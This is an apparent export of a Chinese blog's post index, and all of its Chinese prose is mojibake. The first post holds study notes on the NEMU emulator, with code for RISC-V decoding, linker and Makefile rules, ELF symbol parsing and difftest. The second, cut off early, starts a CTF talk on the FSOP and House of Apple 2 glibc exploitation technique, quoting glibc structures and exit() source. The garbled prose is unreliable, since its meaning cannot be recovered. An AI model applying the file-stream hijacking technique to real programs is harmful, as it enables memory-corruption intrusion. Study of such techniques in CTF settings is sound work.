æ¥ç»Ÿè®¡è¡Œæ•°\nç”±äºæˆ‘ç¯å¢ƒç»å†äº†å¤šæ¬¡è¿ç§»ï¼Œä¼¼ä¹æŠŠ git å¼„åäº†ï¼ˆ\nä¸è¿‡æ¯•ç«Ÿæˆ‘æ²¡æœ‰æäº¤ä½œä¸šçš„éœ€æ±‚ï¼Œå°±ä¸æ³¨æ„è¿™äº›ç»†èŠ‚äº†\nPA2 - ç®€å•å¤æ‚çš„æœºå™¨\nä¸åœè®¡ç®—çš„æœºå™¨\nç”»å‡ºåœ¨ YEMU ä¸Šæ‰§è¡Œçš„åŠ æ³•ç¨‹åºçš„çŠ¶æ€æœº\nç±»ä¼¼åœ°ï¼Œä½¿ç”¨ä¸€ä¸ª 6 å…ƒç»„æ¥åˆ†åˆ«è¡¨ç¤º PC, R [0], R [1], M [x], M [y], M [z].\n(0, 0, 0, x, y ,0) -&gt; (1, y, 0, x, y, 0) -&gt; (2, y, y, x, y, 0) -&gt; (3, x, y , x, y, 0) -&gt; (4, x+y, y, x, y, 0) -&gt; (5, x+y, y, x, y, x+y)\nRTFSC(2)\nç«‹å³æ•°èƒŒåçš„æ•…äº‹\n1. å‡è®¾æˆ‘ä»¬éœ€è¦å°† NEMU è¿è¡Œåœ¨ Motorola\n68k çš„æœºå™¨ä¸Š (æŠŠ NEMU çš„æºä»£ç ç¼–è¯‘æˆ Motorola 68k çš„æœºå™¨ç )\næ­¤æ—¶è¯»å–çš„å­—èŠ‚åºåˆ—ä¼šè¢«è§£é‡Šä¸ºå¤§ç«¯åºçš„ï¼Œå¦‚æœåœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ä»¥å°ç«¯åºå­˜å‚¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´é—®é¢˜ã€‚\n2. å‡è®¾æˆ‘ä»¬éœ€è¦æŠŠ Motorola 68k ä½œä¸ºä¸€ä¸ªæ–°çš„ ISA åŠ å…¥åˆ° NEMU ä¸­\næˆ‘ä»¬éœ€è¦æ­£ç¡®æ¨¡æ‹Ÿå¤§ç«¯åºå¯¹åº”çš„å­˜å‚¨ç»“æ„ä¸è§£é‡Šæ–¹å¼ã€‚\nç«‹å³æ•°èƒŒåçš„æ•…äº‹ (2)\nåœ¨ RISC-V32 ä¸­ï¼Œä¸€èˆ¬ä½¿ç”¨åˆ†éƒ¨åŠ è½½çš„æ–¹å¼ï¼š\né€šè¿‡ lui åŠ è½½é«˜ 20 ä½ï¼Œaddi åŠ è½½ä½ 12 ä½\nlui x10, 0x0D000\naddi x10, x10, 0x721\nauipc çš„æ‰§è¡Œè¿‡ç¨‹\nQEMU å†…å»ºçš„ç¬¬ä¸€æ¡æŒ‡ä»¤ï¼Œæ­£æ˜¯ auipc\n0x00000297,  // auipc t0,0\nåœ¨ QEMU è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œé¦–å…ˆè°ƒç”¨ exec_once() æ¥è¿›å…¥ç›¸åº”çš„å¤„ç†æµç¨‹ã€‚\nstatic void exec_once(Decode *s, vaddr_t pc) {\n  s-&gt;pc = pc;\n  s-&gt;snpc = pc;\n  isa_exec_once(s);\n  cpu.pc = s-&gt;dnpc;\n  \n//some macros...\n}\nä¼ å…¥çš„ Decode æ˜¯ä¸€ä¸ªåŒ…å«ä¸ PC æœ‰å…³å˜é‡çš„ç»“æ„ä½“\ntypedef struct Decode {\n  vaddr_t pc;\n  vaddr_t snpc; // static next pc\n  vaddr_t dnpc; // dynamic next pc\n  ISADecodeInfo isa;\n  IFDEF(CONFIG_ITRACE, char logbuf[128]);\n} Decode;\nç„¶åè°ƒç”¨ isa_exec_once(s)ï¼Œå¯¹äºä¸åŒçš„æ¶æ„ï¼Œå…·ä½“çš„å®šä¹‰ä¸åŒã€‚\ninstruction fetch\nåœ¨ risc-v32 çš„å®ç°ä¸­ï¼Œä»£ç å¦‚ä¸‹\nint isa_exec_once(Decode *s) {\n  s-&gt;isa.inst = inst_fetch(&amp;s-&gt;snpc, 4);\n  return decode_exec(s);\n}\nå…·ä½“çš„è¿‡ç¨‹åˆæ¶‰åŠåˆ° vaddr_read() å’Œ paddr_read()ï¼Œå¤„ç† mmio åœ°å€å’Œ pmem åœ°å€ï¼Œç‰©ç†å†…å­˜ä¸Šä½¿ç”¨ host_read() è¯»å–ä¸»æœºå†…å­˜ä¸Šçš„ä¸åŒé•¿åº¦å­—èŠ‚ã€‚\ninstruction decode\nå®Œæˆå–æŒ‡è°ƒç”¨çš„ä¸€ç³»åˆ—å‡½æ•°åï¼Œisa_exec_once() ä¼šè¿”å› decode_exec(s)\nå°†æŒ‡ä»¤ä¸ç›¸åº”çš„æ¨¡å¼åŒ¹é…\nstatic int decode_exec(Decode *s) {\n  s-&gt;dnpc = s-&gt;snpc;\n\n#define INSTPAT_INST(s) ((s)-&gt;isa.inst)\n#define INSTPAT_MATCH(s, name, type, ... /* execute body */ ) { \\\n  int rd = 0; \\\n  word_t src1 = 0, src2 = 0, imm = 0; \\\n  decode_operand(s, &amp;rd, &amp;src1, &amp;src2, &amp;imm, concat(TYPE_, type)); \\\n  __VA_ARGS__ ; \\\n}\n\n  INSTPAT_START();\n  INSTPAT(\"??????? ????? ????? ??? ????? 00101 11\", auipc  , U, R(rd) = s-&gt;pc + imm);\n  INSTPAT(\"??????? ????? ????? 100 ????? 00000 11\", lbu    , I, R(rd) = Mr(src1 + imm, 1));\n  INSTPAT(\"??????? ????? ????? 000 ????? 01000 11\", sb     , S, Mw(src1 + imm, 1, src2));\n\n  INSTPAT(\"0000000 00001 00000 000 00000 11100 11\", ebreak , N, NEMUTRAP(s-&gt;pc, R(10))); // R(10) is $a0\n  INSTPAT(\"??????? ????? ????? ??? ????? ????? ??\", inv    , N, INV(s-&gt;pc));\n  INSTPAT_END();\n\n  R(0) = 0; // reset $zero to 0\n\n  return 0;\n}\nå…¶ä¸­ï¼Œauipc å¯¹åº”çš„ (U-Type) æ ¼å¼å¦‚ä¸‹ï¼š\n\n\nAUIPC\n\nexecute\nQEMU åœ¨å®ä¸­å®šä¹‰äº† auipc çš„å…·ä½“è¡Œä¸ºï¼š\nINSTPAT(\"??????? ????? ????? ??? ????? 00101 11\", auipc  , U, R(rd) = s-&gt;pc + imm);\npattern_decodeï¼ˆï¼‰ä¸­çš„å®å¤„ç†äº†æ ¼å¼å­—ç¬¦ä¸²ï¼š\nstatic inline void pattern_decode(const char *str, int len,\n    uint64_t *key, uint64_t *mask, uint64_t *shift) {\n  uint64_t __key = 0, __mask = 0, __shift = 0;\n#define macro(i) \\\n  if ((i) &gt;= len) goto finish; \\\n  else { \\\n    char c = str[i]; \\\n    if (c != ' ') { \\\n      Assert(c == '0' || c == '1' || c == '?', \\\n          \"invalid character '%c' in pattern string\", c); \\\n      __key  = (__key  &lt;&lt; 1) | (c == '1' ? 1 : 0); \\\n      __mask = (__mask &lt;&lt; 1) | (c == '?' ? 0 : 1); \\\n      __shift = (c == '?' ? __shift + 1 : 0); \\\n    } \\\n  }\n\n#define macro2(i)  macro(i);   macro((i) + 1)\n#define macro4(i)  macro2(i);  macro2((i) + 2)\n#define macro8(i)  macro4(i);  macro4((i) + 4)\n#define macro16(i) macro8(i);  macro8((i) + 8)\n#define macro32(i) macro16(i); macro16((i) + 16)\n#define macro64(i) macro32(i); macro32((i) + 32)\n  macro64(0);//å®å±•å¼€ï¼Œéå†äº†6ä½äºŒè¿›åˆ¶æ•°0b000000çš„ä»»æ„å–å€¼\n  panic(\"pattern too long\");\n#undef macro\nfinish:\n  *key = __key &gt;&gt; __shift;\n  *mask = __mask &gt;&gt; __shift;\n  *shift = __shift;\n}\nè¿è¡Œç¬¬ä¸€ä¸ª C ç¨‹åº\næˆ‘ä»¬éœ€è¦åœ¨æ­¤éƒ¨åˆ†å®ç°çš„æŒ‡ä»¤æœ‰ lui, addi,\njal, jalr.\næŒ‰ç…§ RISC-V æ‰‹å†Œå®ç°å³å¯ã€‚\néœ€è¦æ³¨æ„ä¸åŒæŒ‡ä»¤å¯¹å¾…æ“ä½œæ•°çš„ç¬¦å·å’Œæˆªæ–­å¤„ç†ã€‚\næŒ‡ä»¤åå¯¹ç…§\næ–¹æ³•å¾ˆå¤šï¼Œå¯ä»¥æ ¹æ® opcode æ®µæŸ¥è¯¢ã€‚\nç¨‹åºï¼Œè¿è¡Œæ—¶ç¯å¢ƒä¸ AM\nè¿è¡Œæ—¶ç¯å¢ƒ\nè¦æ±‚å®ç° spirntf() ç­‰ç­‰åº“å‡½æ•°ï¼Œå¯ä»¥å‚è€ƒ glibc æˆ–è€… STFW.\nRTFSC(3)\nå¯¹å„ä¸ª section çš„å®šä¹‰å¦‚ä¸‹\n//abstract-machine/scripts/linker.ld\n\nENTRY(_start)\nPHDRS { text PT_LOAD; data PT_LOAD; }\n\nSECTIONS {\n  /* _pmem_start and _entry_offset are defined in LDFLAGS */\n  . = _pmem_start + _entry_offset;\n  .text : {\n    *(entry)\n    *(.text*)\n  } : text\n  etext = .;\n  _etext = .;\n  .rodata : {\n    *(.rodata*)\n  }\n  .data : {\n    *(.data)\n  } : data\n  edata = .;\n  _data = .;\n  .bss : {\n\t_bss_start = .;\n    *(.bss*)\n    *(.sbss*)\n    *(.scommon)\n  }\n  _stack_top = ALIGN(0x1000);\n  . = _stack_top + 0x8000;\n  _stack_pointer = .;\n  end = .;\n  _end = .;\n  _heap_start = ALIGN(0x1000);\n}\né˜…è¯» Makefile\nCheck environment and arguments:\n### Override checks when `make clean/clean-all/html`\nifeq ($(findstring $(MAKECMDGOALS),clean|clean-all|html),)\n\n### Print build info message\n$(info # Building $(NAME)-$(MAKECMDGOALS) [$(ARCH)])\n\n//...\n\n### Check: environment variable `$ARCH` must be in the supported list\nARCHS = $(basename $(notdir $(shell ls $(AM_HOME)/scripts/*.mk)))\nifeq ($(filter $(ARCHS), $(ARCH)), )\n  $(error Expected $$ARCH in {$(ARCHS)}, Got \"$(ARCH)\")\nendif\n\n### Checks end here\nendif\nInclude AM makefile specified by $(ARCH):\n-include $(AM_HOME)/scripts/$(ARCH).mk\nâ€‹ in $(ARCH).mk,\nâ€‹ it includes nemu.mk, which builds NEMU related driver\nand runs NEMU.\nâ€‹ it also includes another arch related .mk that overwrites\nARCH_H.\ninclude $(AM_HOME)/scripts/isa/riscv.mk\ninclude $(AM_HOME)/scripts/platform/nemu.mk\nCFLAGS  += -DISA_H=\\\"riscv/riscv.h\\\"\n\nAM_SRCS += riscv/nemu/start.S \\\n           riscv/nemu/cte.c \\\n           riscv/nemu/trap.S \\\n           riscv/nemu/vme.c\nDefine compilation rule:\n## 5. Compilation Rules\n\n### Rule (compile): a single `.c` -&gt; `.o` (gcc)\n$(DST_DIR)/%.o: %.c\n\t@mkdir -p $(dir $@) &amp;&amp; echo + CC $&lt;\n\t@$(CC) -std=gnu11 $(CFLAGS) -c -o $@ $(realpath $&lt;)\n\n### Rule (compile): a single `.cc` -&gt; `.o` (g++)\n$(DST_DIR)/%.o: %.cc\n\t@mkdir -p $(dir $@) &amp;&amp; echo + CXX $&lt;\n\t@$(CXX) -std=c++17 $(CXXFLAGS) -c -o $@ $(realpath $&lt;)\n\n### Rule (compile): a single `.cpp` -&gt; `.o` (g++)\n$(DST_DIR)/%.o: %.cpp\n\t@mkdir -p $(dir $@) &amp;&amp; echo + CXX $&lt;\n\t@$(CXX) -std=c++17 $(CXXFLAGS) -c -o $@ $(realpath $&lt;)\n\n### Rule (compile): a single `.S` -&gt; `.o` (gcc, which preprocesses and calls as)\n$(DST_DIR)/%.o: %.S\n\t@mkdir -p $(dir $@) &amp;&amp; echo + AS $&lt;\n\t@$(AS) $(ASFLAGS) -c -o $@ $(realpath $&lt;)\n\n### Rule (recursive make): build a dependent library (am, klib, ...)\n$(LIBS): %:\n\t@$(MAKE) -s -C $(AM_HOME)/$* archive\n\n### Rule (link): objects (`*.o`) and libraries (`*.a`) -&gt; `IMAGE.elf`, the final ELF binary to be packed into image (ld)\n$(IMAGE).elf: $(LINKAGE) $(LDSCRIPTS)\n\t@echo \\# Creating image [$(ARCH)]\n\t@echo + LD \"-&gt;\" $(IMAGE_REL).elf\nifneq ($(filter $(ARCH),native),)\n\t@$(CXX) -o $@ -Wl,--whole-archive $(LINKAGE) -Wl,-no-whole-archive $(LDFLAGS_CXX)\nelse\n\t@$(LD) $(LDFLAGS) -o $@ --start-group $(LINKAGE) --end-group\nendif\n\n### Rule (archive): objects (`*.o`) -&gt; `ARCHIVE.a` (ar)\n$(ARCHIVE): $(OBJS)\n\t@echo + AR \"-&gt;\" $(shell realpath $@ --relative-to .)\n\t@$(AR) rcs $@ $^\n\n### Rule (`#include` dependencies): paste in `.d` files generated by gcc on `-MMD`\n-include $(addprefix $(DST_DIR)/, $(addsuffix .d, $(basename $(SRCS))))\nBuild the project in order below\nimage: image-dep\narchive: $(ARCHIVE)\nimage-dep: $(LIBS) $(IMAGE).elf\n.NOTPARALLEL: image-dep\n.PHONY: image image-dep archive run $(LIBS)\n# Building add-run [riscv64-nemu]\n# Building am-archive [riscv64-nemu]\n# Building klib-archive [riscv64-nemu]\n+ CC tests/add.c\n# Creating image [riscv64-nemu]\n+ LD -&gt; build/add-riscv64-nemu.elf\n+ OBJCOPY -&gt; build/add-riscv64-nemu.bin\nå®ç°å¸¸ç”¨çš„åº“å‡½æ•°\nstdarg æ˜¯å¦‚ä½•å®ç°çš„ï¼Ÿ\nåœ¨\nå‚è€ƒ GNU/gcc-15.2.0 ä¸­ i386 çš„å®ç°ï¼š\nè®¡ç®—å›ºå®šå‚æ•°çš„å¤§å°\n//gcc-15.2.0/gcc/config/i386/i386.cc\n\n  /* Count number of gp and fp argument registers used.  */\n  words = crtl-&gt;args.info.words;\n  n_gpr = crtl-&gt;args.info.regno;\n  n_fpr = crtl-&gt;args.info.sse_regno;\n\n  if (cfun-&gt;va_list_gpr_size)\n    {\n      type = TREE_TYPE (gpr);\n      t = build2 (MODIFY_EXPR, type,\n\t\t  gpr, build_int_cst (type, n_gpr * 8));\n      TREE_SIDE_EFFECTS (t) = 1;\n      expand_expr (t, const0_rtx, VOIDmode, EXPAND_NORMAL);\n    }\n\n  if (TARGET_SSE &amp;&amp; cfun-&gt;va_list_fpr_size)\n    {\n      type = TREE_TYPE (fpr);\n      t = build2 (MODIFY_EXPR, type, fpr,\n\t\t  build_int_cst (type, n_fpr * 16 + 8*X86_64_REGPARM_MAX));\n      TREE_SIDE_EFFECTS (t) = 1;\n      expand_expr (t, const0_rtx, VOIDmode, EXPAND_NORMAL);\n    }\nå¤„ç†æ ˆä¸Šçš„ overflow area, register save area.\n /* Find the overflow area.  */\n type = TREE_TYPE (ovf);\n if (cfun-&gt;machine-&gt;split_stack_varargs_pointer == NULL_RTX)\n   ovf_rtx = crtl-&gt;args.internal_arg_pointer;\n else\n   ovf_rtx = cfun-&gt;machine-&gt;split_stack_varargs_pointer;\n t = make_tree (type, ovf_rtx);\n if (words != 0)\n   t = fold_build_pointer_plus_hwi (t, words * UNITS_PER_WORD);\n\n t = build2 (MODIFY_EXPR, type, ovf, t);\n TREE_SIDE_EFFECTS (t) = 1;\n expand_expr (t, const0_rtx, VOIDmode, EXPAND_NORMAL);\n\n if (ix86_varargs_gpr_size || ix86_varargs_fpr_size)\n   {\n     /* Find the register save area.\n Prologue of the function save it right above stack frame.  */\n     type = TREE_TYPE (sav);\n     t = make_tree (type, frame_pointer_rtx);\n     if (!ix86_varargs_gpr_size)\nt = fold_build_pointer_plus_hwi (t, -8 * X86_64_REGPARM_MAX);\n\n     t = build2 (MODIFY_EXPR, type, sav, t);\n     TREE_SIDE_EFFECTS (t) = 1;\n     expand_expr (t, const0_rtx, VOIDmode, EXPAND_NORMAL);\n   }\nåŸºç¡€è®¾æ–½ (2)\næŒ‡ä»¤ç¯å½¢ç¼“å†²åŒº - iringbuf\nå®ç°ä¸€ä¸ªç¯å½¢ç¼“å†²åŒºï¼Œæ¯æ¬¡æ‰§è¡ŒæŒ‡ä»¤æ—¶å†™å…¥å³å¯\ntypedef struct\n{\n  char buf[10][128];\n  int head;\n  int tail;\n} LogRingbuf;\n\nIFDEF(CONFIG_ITRACE, LogRingbuf ringbuf);\n\nvoid ringbuf_push(LogRingbuf *r, const char* log) {\n  strcpy(r-&gt;buf[r-&gt;head], log);\n  r-&gt;head = (r-&gt;head+1) % 10;\n  if(r-&gt;head == r-&gt;tail) r-&gt;tail = (r-&gt;tail+1) % 10;\n}\n\nvoid ringbuf_puts(LogRingbuf *r) {\n  for(int i = r-&gt;tail; i!=r-&gt;head; i = (i+1)%10) {\n    printf(\"%s\\n\", r-&gt;buf[i]);\n  }\n}\nå‡½æ•°è°ƒç”¨çš„è¸ªè¿¹ - ftrace\nå·æ‡’äº†ï¼Œå¹¶æ²¡æœ‰å®Œå…¨å®ç°ï¼ˆ\nå…ˆè¯»å–ä¼ å…¥çš„ ELF:\n#include &lt;common.h&gt;\n#include &lt;elf.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid init_ftrace(const char* elf) {\n  Elf64_Ehdr elf_header;\n  FILE *fp = fopen(elf, \"rb\");\n  if (fp == NULL) {\n    printf(\"Failed to open file %s\\n\", elf);\n    return;\n  }\n  size_t count = fread(&amp;elf_header, 1, sizeof(Elf64_Ehdr), fp);\n  assert(count == sizeof(Elf64_Ehdr));\n\n  parse_symbols(fp, &amp;elf_header);\n}\næ ¹æ® ELF çš„ç»“æ„ï¼Œæˆ‘ä»¬å…ˆè¯»å– Elf64_Ehdr:\n\n\nELF\n\nELF header (Ehdr)\n    The ELF header is described by the type Elf32_Ehdr or Elf64_Ehdr:\n\n        #define EI_NIDENT 16\n\n        typedef struct {\n            unsigned char e_ident[EI_NIDENT];\n            uint16_t      e_type;\n            uint16_t      e_machine;\n            uint32_t      e_version;\n            ElfN_Addr     e_entry;\n            ElfN_Off      e_phoff;\n            ElfN_Off      e_shoff;\n            uint32_t      e_flags;\n            uint16_t      e_ehsize;\n            uint16_t      e_phentsize;\n            uint16_t      e_phnum;\n            uint16_t      e_shentsize;\n            uint16_t      e_shnum;\n            uint16_t      e_shstrndx;\n        } ElfN_Ehdr;\nè§£æå…·ä½“çš„ç¬¦å·è¡¨ï¼Œå¹¶ç»´æŠ¤ä¸€ä¸ªå•å‘é“¾è¡¨ï¼š\nvoid parse_symbols(FILE *fp, Elf64_Ehdr *elf_header) {\n  Elf64_Shdr *sh_table = malloc(elf_header-&gt;e_shnum * sizeof(Elf64_Shdr));\n  fseek(fp, elf_header-&gt;e_shoff, SEEK_SET);\n  size_t ret = fread(sh_table, sizeof(Elf64_Shdr), elf_header-&gt;e_shnum, fp);\n  assert(ret == elf_header-&gt;e_shnum);\n\n  Elf64_Shdr *symtab_shdr = NULL;\n  Elf64_Shdr *strtab_shdr = NULL;\n\n  for (int i = 0; i &lt; elf_header-&gt;e_shnum; i++) {\n    if (sh_table[i].sh_type == SHT_SYMTAB) {\n      symtab_shdr = &amp;sh_table[i];\n      if (symtab_shdr-&gt;sh_link &lt; elf_header-&gt;e_shnum) {\n        strtab_shdr = &amp;sh_table[symtab_shdr-&gt;sh_link];\n      }\n      break;\n    }\n  }\n\n  if (!symtab_shdr || !strtab_shdr) {\n    printf(\"Symbol table or string table not found.\\n\");\n    free(sh_table);\n    return;\n  }\n\n  Elf64_Sym *sym_table = malloc(symtab_shdr-&gt;sh_size);\n  fseek(fp, symtab_shdr-&gt;sh_offset, SEEK_SET);\n  ret = fread(sym_table, symtab_shdr-&gt;sh_size, 1, fp);\n  assert(ret == 1);\n\n  char *strtab = malloc(strtab_shdr-&gt;sh_size);\n  fseek(fp, strtab_shdr-&gt;sh_offset, SEEK_SET);\n  ret = fread(strtab, strtab_shdr-&gt;sh_size, 1, fp);\n  assert(ret == 1);\n\n\n  int num_symbols = symtab_shdr-&gt;sh_size / sizeof(Elf64_Sym);\n  //printf(\"Parsing %d symbols...\\n\", num_symbols);\n\n  for (int i = 0; i &lt; num_symbols; i++) {\n    const char *symbol_name = &amp;strtab[sym_table[i].st_name];\n    Elf64_Addr symbol_addr = sym_table[i].st_value;\n    unsigned char symbol_type = ELF64_ST_TYPE(sym_table[i].st_info);\n\n    if (symbol_type == STT_FUNC) {\n//      printf(\"Found function: %s at address 0x%lx\\n\", symbol_name, symbol_addr);\n      ftrace_append(symbol_name, symbol_addr);\n    }\n  }\n\n  free(sh_table);\n  free(sym_table);\n  free(strtab);\n}\nSection header ä¸­å­˜æ”¾äº†å„ä¸ª section çš„ä¿¡æ¯\nSection header (Shdr)\n    A file's section header table lets one locate all the file's sections.  The section header table is an array of Elf32_Shdr or Elf64_Shdr structures.  The ELF\n    header's e_shoff member gives the byte offset from the beginning of the file to the section header table.  e_shnum holds the number of  entries  the  section\n    header table contains.  e_shentsize holds the size in bytes of each entry.\n\n    A  section  header  table  index  is  a subscript into this array.  Some section header table indices are reserved: the initial entry and the indices between\n    SHN_LORESERVE and SHN_HIRESERVE.  The initial entry is used in ELF extensions for e_phnum, e_shnum, and e_shstrndx; in other cases, each field in the initial\n    entry is set to zero.  An object file does not have sections for these special indices:\n\n    SHN_UNDEF\n           This value marks an undefined, missing, irrelevant, or otherwise meaningless section reference.\n\n    SHN_LORESERVE\n           This value specifies the lower bound of the range of reserved indices.\n\n    SHN_LOPROC\n    SHN_HIPROC\n           Values greater in the inclusive range [SHN_LOPROC, SHN_HIPROC] are reserved for processor-specific semantics.\n\n    SHN_ABS\n           This value specifies the absolute value for the corresponding reference.  For example, a symbol defined relative to section number SHN_ABS has an  abâ€\n           solute value and is not affected by relocation.\n\n    SHN_COMMON\n           Symbols defined relative to this section are common symbols, such as FORTRAN COMMON or unallocated C external variables.\n\n    SHN_HIRESERVE\n           This  value  specifies  the upper bound of the range of reserved indices.  The system reserves indices between SHN_LORESERVE and SHN_HIRESERVE, incluâ€\n           sive.  The section header table does not contain entries for the reserved indices.\n\nElf64_Sym çš„å®šä¹‰å¦‚ä¸‹:\n  String and symbol tables\n      String table sections hold null-terminated character sequences, commonly called strings. The obâ€\n      ject file uses these strings to represent symbol and section names. One references a string as\n      an index into the string table section.  The first byte, which is index zero, is defined to  hold\n      a null byte ('\\0'). Similarly, a string table's last byte is defined to hold a null byte, ensurâ€\n      ing null termination for all strings.\n\n      An  object file's symbol table holds information needed to locate and relocate a program's symâ€\n      bolic definitions and references. A symbol table index is a subscript into this array.\n\ntypedef struct {\n              uint32_t      st_name;\n              //This member holds an index into the object file's symbol string table, which holds character representations of the symbol names. If the value is nonzero, it represents a string table index that gives the symbol name. Otherwise, the symbol has no name.\n              unsigned char st_info;\n              unsigned char st_other;\n              uint16_t      st_shndx;\n              Elf64_Addr    st_value;\n              uint64_t      st_size;\n          } Elf64_Sym;\n\nåé¢é‡åˆ° jal ç­‰è·³è½¬æŒ‡ä»¤æŸ¥æ‰¾è¿™ä¸ªé“¾è¡¨ï¼Œè®¡ç®—åç§»å°±å¯ä»¥äº†ã€‚\nDifferential Testing\næ¡†æ¶å·²ç»å®ç°å¥½äº†ç›¸åº”çš„æ¥å£ï¼Œå®ç°ä¸€ä¸‹æ¯”è¾ƒå¯„å­˜å™¨çš„å€¼\nbool isa_difftest_checkregs(CPU_state *ref_r, vaddr_t pc) {\n  bool ok = true;\nfor(int i=0;i&lt;32;i++) {\n  if(ref_r-&gt;gpr[i] != cpu.gpr[i]) {\n    printf(\"\\n [difftest] inequal reg value in %s: 0x%lx\\n\", regs[i], ref_r-&gt;gpr[i]);\n    ok = false;\n  }\n}\n  if(ref_r-&gt;pc != cpu.pc) {\n    printf(\"\\n [difftest] inequal pc: 0x%lx\\n\",ref_r-&gt;pc);\n    ok = false;\n  }\n  return ok;\n}\nè¾“å…¥è¾“å‡º\nå®ç°éœ€è¦çš„ IOE åŠŸèƒ½éƒ½æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œåœ¨è·‘ microbench çš„æ—¶å€™é‡åˆ°äº†ä¸€ä¸ªæ¯”è¾ƒæ€ªçš„é—®é¢˜ã€‚\ndifftest æç¤º\nReferences\n\nhttps://lf-riscv.atlassian.net/wiki/spaces/HOME/pages/16154769/RISC-V+Technical+Specifications#ISA-Specifications\nhttps://gcc.gnu.org/onlinedocs/gcc-15.1.0/gcc.pdf\nhttps://elixir.bootlin.com/glibc/glibc-2.42.9000/source\nhttps://gist.github.com/x0nu11byt3/bcb35c3de461e5fb66173071a2379779#file-elf_format_cheatsheet-md\n\n","categories":["Study"],"tags":["ICS"]},{"title":"Vidar åˆ†äº«ä¼š - FSOP","url":"/categories/CTF/vidarshare-fsop/","content":"I. FSOP\n\nFSOP æ˜¯ File Stream Oriented Programming çš„ç¼©å†™ã€‚\nFSOP çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯åŠ«æŒ\n_IO_list_all çš„å€¼æ¥ä¼ªé€ é“¾è¡¨å’Œå…¶ä¸­çš„\n_IO_FILE é¡¹ï¼Œä½†æ˜¯å•çº¯çš„ä¼ªé€ åªæ˜¯æ„é€ äº†æ•°æ®è¿˜éœ€è¦æŸç§æ–¹æ³•è¿›è¡Œè§¦å‘ã€‚FSOP\né€‰æ‹©çš„è§¦å‘æ–¹æ³•æ˜¯è°ƒç”¨_IO_flush_all_lockpï¼Œè¿™ä¸ªå‡½æ•°ä¼šåˆ·æ–°_IO_list_all é“¾è¡¨ä¸­æ‰€æœ‰é¡¹çš„æ–‡ä»¶æµï¼Œç›¸å½“äºå¯¹æ¯ä¸ª\nFILE è°ƒç”¨\nfflushï¼Œä¹Ÿå¯¹åº”ç€ä¼šè°ƒç”¨_IO_FILE_plus.vtable ä¸­çš„_IO_overflowã€‚\n\n\nII. RTFSC\nä¸‹é¢æˆ‘å°†ä»¥ glibc-2.39 æºç ä¸ºä¾‹ï¼Œåˆ†æ FSOP çš„ä¸€ä¸ªå®é™…åº”ç”¨ ---House of\nApple (2)1 æ¶‰åŠçš„åŸç†ã€‚\n_IO_FILE\n/libio/bits/types/struct_FILE.h ä¸­æœ‰å¦‚ä¸‹å®šä¹‰ï¼š\nstruct _IO_FILE\n{\n  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  char *_IO_read_ptr;\t/* Current read pointer */\n  char *_IO_read_end;\t/* End of get area. */\n  char *_IO_read_base;\t/* Start of putback+get area. */\n  char *_IO_write_base;\t/* Start of put area. */\n  char *_IO_write_ptr;\t/* Current put pointer. */\n  char *_IO_write_end;\t/* End of put area. */\n  char *_IO_buf_base;\t/* Start of reserve area. */\n  char *_IO_buf_end;\t/* End of reserve area. */\n\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n  int _flags2;\n  __off_t _old_offset; /* This used to be _offset but it's too small.  */\n\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n\n  _IO_lock_t *_lock;\n#ifdef _IO_USE_OLD_IO_FILE\n};\n\nstruct _IO_FILE_complete\n{\n  struct _IO_FILE _file;\n#endif\n  __off64_t _offset;\n  /* Wide character stream stuff.  */\n  struct _IO_codecvt *_codecvt;\n  struct _IO_wide_data *_wide_data;\n  struct _IO_FILE *_freeres_list;\n  void *_freeres_buf;\n  size_t __pad5;\n  int _mode;\n  /* Make sure we don't get into trouble again.  */\n  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];\n};\nä½¿ç”¨ gdbï¼Œå¯ä»¥å¾—åˆ°å…¶æˆå‘˜çš„ç›¸å¯¹åç§»ï¼š\n\n\nimg\n\nExit () è°ƒç”¨è¿‡ç¨‹\n__run_exit_handlers()\nexit() åœ¨ /stdlib/exit.c æœ‰å®šä¹‰:\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;pointer_guard.h&gt;\n#include &lt;libc-lock.h&gt;\n#include &lt;set-freeres.h&gt;\n#include \"exit.h\"\n\n/* Initialize the flag that indicates exit function processing\n   is complete. See concurrency notes in stdlib/exit.h where\n   __exit_funcs_lock is declared.  */\nbool __exit_funcs_done = false;\n\n/* Call all functions registered with `atexit' and `on_exit',\n   in the reverse of the order in which they were registered\n   perform stdio cleanup, and terminate program execution with STATUS.  */\nvoid\nattribute_hidden\n__run_exit_handlers (int status, struct exit_function_list **listp,\n\t\t     bool run_list_atexit, bool run_dtors)\n{\n  /* First, call the TLS destructors.  */\n  if (run_dtors)\n    call_function_static_weak (__call_tls_dtors);\n\n  __libc_lock_lock (__exit_funcs_lock);\n\n  /* We do it this way to handle recursive calls to exit () made by\n     the functions registered with `atexit' and `on_exit'. We call\n     everyone on the list and use the status value in the last\n     exit (). */\n  while (true)\n    {\n      struct exit_function_list *cur;\n\n    restart:\n      cur = *listp;\n\n      if (cur == NULL)\n\t{\n\t  /* Exit processing complete.  We will not allow any more\n\t     atexit/on_exit registrations.  */\n\t  __exit_funcs_done = true;\n\t  break;\n\t}\n\n      while (cur-&gt;idx &gt; 0)\n\t{\n\t  struct exit_function *const f = &amp;cur-&gt;fns[--cur-&gt;idx];\n\t  const uint64_t new_exitfn_called = __new_exitfn_called;\n\n\t  switch (f-&gt;flavor)\n\t    {\n\t      void (*atfct) (void);\n\t      void (*onfct) (int status, void *arg);\n\t      void (*cxafct) (void *arg, int status);\n\t      void *arg;\n\n\t    case ef_free:\n\t    case ef_us:\n\t      break;\n\t    case 